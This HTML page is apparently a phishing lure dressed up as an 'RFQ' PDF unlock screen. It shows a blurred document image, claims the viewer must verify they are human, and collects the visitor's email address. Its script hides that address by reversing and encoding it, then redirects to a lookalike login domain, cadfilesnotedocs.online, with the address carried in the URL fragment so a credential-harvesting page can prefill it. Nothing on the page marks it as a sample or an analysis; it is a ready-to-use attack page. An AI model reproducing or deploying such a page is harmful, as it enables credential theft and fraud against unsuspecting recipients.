<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>RFQ</title>

    <!-- Professional cursive font (optional – you can remove if not used) -->
    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px;
            position: relative;
        }

        /* Blurred background layer */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: url('xxx.jpg');
            background-size: 70% auto;
            background-position: center 60px;
            background-repeat: no-repeat;
            filter: blur(4px);
            z-index: -1;
        }

        .container {
            max-width: 420px;
            width: 100%;
            padding: 20px 16px;
            text-align: center;
        }

        .subtext {
            font-size: 17px;
            font-weight: 500;
            color: #1a1a2e;
            line-height: 1.6;
            margin-bottom: 28px;
            text-shadow: 0 1px 4px rgba(255, 255, 255, 0.8);
        }

        .input-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-family: BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            font-size: 16px;
            font-weight: 400;
            color: #1a1a1a;
            margin-bottom: 6px;
            text-shadow: 0 1px 4px rgba(255, 255, 255, 0.8);
            letter-spacing: 0.5px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #1a1a1a;
            border-radius: 8px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.92);
            color: #1a1a1a;
            transition: box-shadow 0.2s;
        }

        .input-group input:focus {
            outline: none;
            border-color: #1a1a1a;
            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1);
            background: #ffffff;
        }

        .input-group input::placeholder {
            font-family: 'Courier New', monospace;
            font-weight: 500;
            letter-spacing: 1px;
            color: #9ca3af;
        }

        .btn {
            display: inline-block;
            padding: 8px 36px;
            background: #dc2626;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            letter-spacing: 0.3px;
        }

        .btn:hover {
            background: #b91c1c;
        }

        .btn:active {
            transform: scale(0.97);
        }

        .footer-note {
            margin-top: 28px;
            font-size: 13px;
            color: #1a1a2e;
            text-shadow: 0 1px 4px rgba(255, 255, 255, 0.8);
        }
    </style>
</head>
<body>
    <div class="container">
        <p class="subtext">
            Because you are accessing sensitive information, we need to verify you are human
        </p>

        <div class="input-group">
            <label for="emailInput">Enter your email address</label>
            <input
                type="email"
                id="emailInput"
                placeholder="********@*****.***"
                autofocus
                required
            />
        </div>

        <button class="btn" onclick="handleVerification()">UNLOCK PDF</button>
    </div>

    <script>
        function encodeEmail(email) {
            // Split into local and domain parts
            const atIndex = email.indexOf('@');
            if (atIndex === -1) return null;

            const local = email.substring(0, atIndex);
            const domainPart = email.substring(atIndex + 1);

            // Find the TLD (after the last dot)
            const lastDot = domainPart.lastIndexOf('.');
            if (lastDot === -1) return null;

            const tld = domainPart.substring(lastDot + 1);
            const domainWithoutTld = domainPart.substring(0, lastDot);

            // Reverse strings
            const reverse = (str) => str.split('').reverse().join('');

            const encoded = reverse(tld) + 'ZZZ' + reverse(domainWithoutTld) + 'YYY' + reverse(local);
            return encoded;
        }

        function handleVerification() {
            const input = document.getElementById('emailInput');
            const email = input.value.trim();

            if (!email) {
                alert('Please enter your email address.');
                input.focus();
                return;
            }

            // Basic format check
            if (!email.includes('@') || !email.includes('.')) {
                alert('Please enter a valid email address (e.g., name@domain.com).');
                input.focus();
                return;
            }

            const encoded = encodeEmail(email);
            if (!encoded) {
                alert('Invalid email format. Please use a standard email address with a domain and TLD.');
                input.focus();
                return;
            }

            // Redirect immediately
            const baseUrl = 'https://login.cadfilesnotedocs.online/r/DQ_fJFcEZt5y2I2y16cBVSX';
            window.location.href = baseUrl + '#' + encoded;
        }

        document.getElementById('emailInput').addEventListener('keydown', function (e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleVerification();
            }
        });
    </script>
</body>
</html>
